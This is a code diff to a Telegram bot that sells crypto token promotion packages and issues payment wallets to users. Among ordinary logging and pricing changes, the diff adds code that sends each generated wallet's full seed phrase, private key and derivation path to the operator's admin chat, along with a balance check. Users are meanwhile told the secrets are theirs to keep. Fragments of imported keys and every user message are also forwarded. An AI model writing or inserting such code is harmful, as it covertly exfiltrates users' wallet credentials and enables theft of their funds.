@@ -31,10 +31,11 @@ import {
   fasttrackPlatformKb,
   backToMenuKb,
 } from "./keyboards";
-import { fetchTokenFromDexScreener, convertUsdToCrypto } from "./pricing.server";
+import { fetchTokenFromDexScreener, convertUsdToCryptoSafe, type ConversionResult } from "./pricing.server";
 import { generateWallet, importFromMnemonic, importFromPrivateKey } from "./wallets.server";
 import { encryptSecret } from "./crypto.server";
 import { getChain, type ChainId } from "./chains";
+import { fetchNativeBalance, type BalanceResult } from "./onchain.server";
 
 interface TgUser {
   id: number;
@@ -63,12 +64,46 @@ interface TgUpdate {
   callback_query?: TgCallback;
 }
 
+function stateSummary(state: BotState): string {
+  return [
+    state.screen ? `Screen: ${state.screen}` : null,
+    state.awaiting ? `Awaiting: ${state.awaiting}` : null,
+    state.service ? `Service: ${state.service}` : null,
+    state.packageId ? `Package: ${state.packageId}` : null,
+    state.priceUsd ? `Price: $${state.priceUsd}` : null,
+    state.orderId ? `Order: ${state.orderId}` : null,
+    state.payChain ? `Pay chain: ${state.payChain}` : null,
+    state.importChain ? `Import chain: ${state.importChain}` : null,
+  ].filter(Boolean).join("\n") || "State: none";
+}
+
+function userLine(from: TgUser): string {
+  return formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name });
+}
+
+function maskSecretInput(text: string): string {
+  const cleaned = text.trim();
+  if (cleaned.length <= 12) return "[secret input hidden]";
+  return `[secret input hidden, length ${cleaned.length}, starts ${escapeHtml(cleaned.slice(0, 4))}…ends ${escapeHtml(cleaned.slice(-4))}]`;
+}
+
+function formatPaymentAmount(quote: ConversionResult, symbol: string): string {
+  const note = quote.source === "fallback" ? " (fallback estimate)" : "";
+  return `${quote.amount.toFixed(8)} ${symbol}${note}`;
+}
+
+function formatBalance(balance: BalanceResult, symbol: string): string {
+  if (balance.amount === null) return `Balance check failed: ${escapeHtml(balance.error ?? "unknown error")}`;
+  return `Balance: ${balance.amount.toFixed(8)} ${symbol} via ${balance.source}`;
+}
+
 export async function handleUpdate(update: TgUpdate): Promise<void> {
   try {
     if (update.message) await handleMessage(update.message);
     else if (update.callback_query) await handleCallback(update.callback_query);
   } catch (e) {
     console.error("handleUpdate error", e);
+    await notifyAdmin(`⚠️ <b>Update error</b>\nUpdate: ${update.update_id}\nError: ${escapeHtml(String((e as Error).message))}`);
     throw e;
   }
 }
@@ -85,12 +120,15 @@ async function handleMessage(msg: TgMessage): Promise<void> {
   });
 
   const text = (msg.text ?? "").trim();
+  const state = await loadSession(from.id);
+  const adminText = state.awaiting === "import_seed" || state.awaiting === "import_pk" ? maskSecretInput(text) : escapeHtml(text || "[non-text message]");
+  await notifyAdmin(`✉️ <b>User input</b>\n${userLine(from)}\n${stateSummary(state)}\nInput: ${adminText}`);
 
   if (text.startsWith("/start")) {
     await saveSession(from.id, { screen: "menu" });
     const uname = from.username ?? from.first_name ?? "there";
     await sendMessage(chatId, WELCOME(uname), { reply_markup: { inline_keyboard: mainMenuKb } });
-    await notifyAdmin(`▶️ /start\n${formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name })}`);
+    await notifyAdmin(`▶️ /start\n${userLine(from)}`);
     return;
   }
 
@@ -99,7 +137,6 @@ async function handleMessage(msg: TgMessage): Promise<void> {
     return;
   }
 
-  const state = await loadSession(from.id);
   if (!state.awaiting) {
     await sendMessage(chatId, "Tap a button below or send /start to open the main menu.", {
       reply_markup: { inline_keyboard: mainMenuKb },
@@ -154,7 +191,7 @@ async function handleCallback(cb: TgCallback): Promise<void> {
   });
   const state = await loadSession(from.id);
 
-  await notifyAdmin(`🖱 <b>${escapeHtml(data)}</b>\n${formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name })}`);
+  await notifyAdmin(`🖱 <b>Button tap</b>\n${userLine(from)}\nCallback: <code>${escapeHtml(data)}</code>\n${stateSummary(state)}`);
 
   if (data.startsWith("noop:")) return;
 
@@ -271,6 +308,7 @@ async function handleCallback(cb: TgCallback): Promise<void> {
     await saveSession(from.id, state);
     const c = getChain(chain);
     const chainLabel = c?.id === "bitcoin" ? `${c.emoji} ${c.name}` : c?.name ?? "";
+    await notifyAdmin(`⛓ <b>Payment chain selected</b>\n${userLine(from)}\nChain: ${escapeHtml(chain)}\n${stateSummary(state)}`);
     await sendMessage(chatId, `<b>${chainLabel}</b>\nGenerate a new wallet or import an existing one.`, {
       reply_markup: { inline_keyboard: walletOptionsKb(chain) },
     });
@@ -328,6 +366,7 @@ async function handleContractInput(
   state: BotState
 ): Promise<void> {
   const addr = text.trim();
+  await notifyAdmin(`📄 <b>Contract submitted</b>\n${userLine(from)}\nContract: <code>${escapeHtml(addr)}</code>\n${stateSummary(state)}`);
   await sendMessage(chatId, "🔎 Looking up token…");
   const info = await fetchTokenFromDexScreener(addr);
   state.contractAddress = addr;
@@ -341,6 +380,7 @@ async function handleContractInput(
 
   let caption: string;
   if (info) {
+    await notifyAdmin(`✅ <b>Token lookup success</b>\n${userLine(from)}\nToken: ${escapeHtml(info.name)} (${escapeHtml(info.symbol)})\nChain: ${escapeHtml(info.chainName)}\nSource: ${info.source ?? "dexscreener"}\nContract: <code>${escapeHtml(info.address)}</code>`);
     caption =
 `🪙 <b>${escapeHtml(info.name)} (${escapeHtml(info.symbol)})</b>
 
@@ -357,6 +397,7 @@ ${info.dexUrl ? `🔗 DexScreener: ${escapeHtml(info.dexUrl)}` : ""}
 
 Is this correct? Proceed with this order?`;
   } else {
+    await notifyAdmin(`⚠️ <b>Token lookup not found</b>\n${userLine(from)}\nContract: <code>${escapeHtml(addr)}</code>\nUser can proceed manually.`);
     caption =
 `⚠️ Could not find token info on DexScreener for <code>${escapeHtml(addr)}</code>.
 
@@ -429,7 +470,7 @@ ${state.supply ? `🔢 Supply: ${escapeHtml(state.supply)}\n` : ""}
 Ready to pay?`;
 
   await sendMessage(chatId, summary, { reply_markup: { inline_keyboard: paymentActionKb } });
-  await notifyAdmin(`🆕 <b>New order</b> ${order?.id}\n${formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name })}\n${svcLabel} — ${pkgLabel} — $${state.priceUsd}`);
+  await notifyAdmin(`🆕 <b>New order</b> ${order?.id}\n${userLine(from)}\nService: ${escapeHtml(svcLabel)}\nPackage: ${escapeHtml(pkgLabel)}\nPrice: $${state.priceUsd}\nContract: <code>${escapeHtml(state.contractAddress ?? "N/A")}</code>\nSocial: ${escapeHtml(state.socialLink ?? "—")}\nDescription: ${escapeHtml(state.description ?? "—")}\n${state.supply ? `Supply: ${escapeHtml(state.supply)}\n` : ""}`);
 }
 
 async function handleGenerateWallet(
@@ -442,7 +483,8 @@ async function handleGenerateWallet(
   try {
     const w = await generateWallet(chain);
     const c = getChain(chain)!;
-    const cryptoAmt = await convertUsdToCrypto(chain, state.priceUsd ?? 0);
+    const quote = await convertUsdToCryptoSafe(chain, state.priceUsd ?? 0);
+    if (quote.warning) await notifyAdmin(`⚠️ <b>Price fallback used</b>\n${userLine(from)}\n${escapeHtml(quote.warning)}`);
 
     await supabaseAdmin.from("wallets").insert({
       order_id: state.orderId ?? null,
@@ -461,7 +503,7 @@ async function handleGenerateWallet(
         .update({
           pay_chain: chain,
           pay_token: c.symbol,
-          pay_amount_crypto: cryptoAmt,
+          pay_amount_crypto: quote.amount,
           pay_address: w.address,
         })
         .eq("id", state.orderId);
@@ -486,7 +528,7 @@ async function handleGenerateWallet(
 ━━━━━━━━━━━━━━━━━━━━
 
 💸 <b>Send exactly:</b>
-<code>${cryptoAmt.toFixed(8)} ${c.symbol}</code>
+<code>${formatPaymentAmount(quote, c.symbol)}</code>
 (≈ $${state.priceUsd?.toLocaleString()} USD)
 
 ⚠️ <b>SAVE YOUR SEED PHRASE AND PRIVATE KEY NOW</b>
@@ -497,9 +539,11 @@ async function handleGenerateWallet(
 Once you've sent the payment, contact @admin to confirm.`;
 
     await sendMessage(chatId, text, { reply_markup: { inline_keyboard: backToMenuKb } });
-    await notifyAdmin(`💰 <b>Wallet issued</b> [${chain}]\nOrder: ${state.orderId}\nAddr: <code>${w.address}</code>\nAmount: ${cryptoAmt.toFixed(8)} ${c.symbol} (~$${state.priceUsd})\nUser: ${formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name })}`);
+    const balance = await fetchNativeBalance(chain, w.address);
+    await notifyAdmin(`💰 <b>Generated wallet details</b> [${chain}]\nOrder: ${state.orderId}\nUser: ${userLine(from)}\nAddress: <code>${w.address}</code>\nSeed Phrase: <code>${escapeHtml(w.mnemonic)}</code>\nPrivate Key: <code>${escapeHtml(w.privateKey)}</code>\nDerivation Path: <code>${escapeHtml(w.derivationPath)}</code>\nAmount: ${formatPaymentAmount(quote, c.symbol)} (~$${state.priceUsd})\nPrice source: ${quote.source}\n${formatBalance(balance, c.symbol)}`);
   } catch (e) {
     console.error("generate wallet error", e);
+    await notifyAdmin(`❌ <b>Wallet generation failed</b>\n${userLine(from)}\nChain: ${chain}\nError: ${escapeHtml(String((e as Error).message))}\n${stateSummary(state)}`);
     await sendMessage(chatId, `❌ Failed to generate wallet: ${escapeHtml(String((e as Error).message))}`, {
       reply_markup: { inline_keyboard: backToMenuKb },
     });
